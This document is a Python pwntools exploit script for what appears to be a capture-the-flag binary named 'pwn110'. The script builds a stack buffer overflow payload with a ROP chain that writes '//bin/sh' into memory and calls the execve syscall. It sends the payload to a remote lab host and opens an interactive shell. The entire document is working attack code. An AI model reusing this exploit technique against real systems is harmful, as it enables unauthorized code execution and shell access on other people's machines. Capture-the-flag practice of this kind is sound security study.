from pwn import *
from struct import pack

def find_rip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()                    # wait process to crash
    rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located RIP offset at {a}'.format(a=rip_offset))

exe = './pwn110'
elf = context.binary = ELF(exe) # will exec checksec
context.log_level = 'debug'     # a lot of debug info
#offset = find_rip(cyclic(100))
#exit()
offset = 40

# $ ropper --file pwn110 --chain "execve cmd=/bin/sh" --badbytes 0a
p = lambda x : pack('Q', x)
IMAGE_BASE_0 = elf.address #0x0000000000400000 
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''
rop += rebase_0(0x00000000000119d8) # 0x00000000004119d8: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x000000000000207b) # 0x000000000040207b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084755) # 0x0000000000484755: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000119d8) # 0x00000000004119d8: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000207b) # 0x000000000040207b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084755) # 0x0000000000484755: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000191a) # 0x000000000040191a: pop rdi; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f4de) # 0x000000000040f4de: pop rsi; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x000000000000181f) # 0x000000000040181f: pop rdx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000497d7) # 0x00000000004497d7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000173d4) # 0x00000000004173d4: syscall; ret;

payload = b'A' * offset
payload += rop

#p = process(exe)
p = remote('10.10.92.215', 9010)
p.recvuntil(b'libc ')
p.recvline()
p.sendline(payload)
p.interactive()

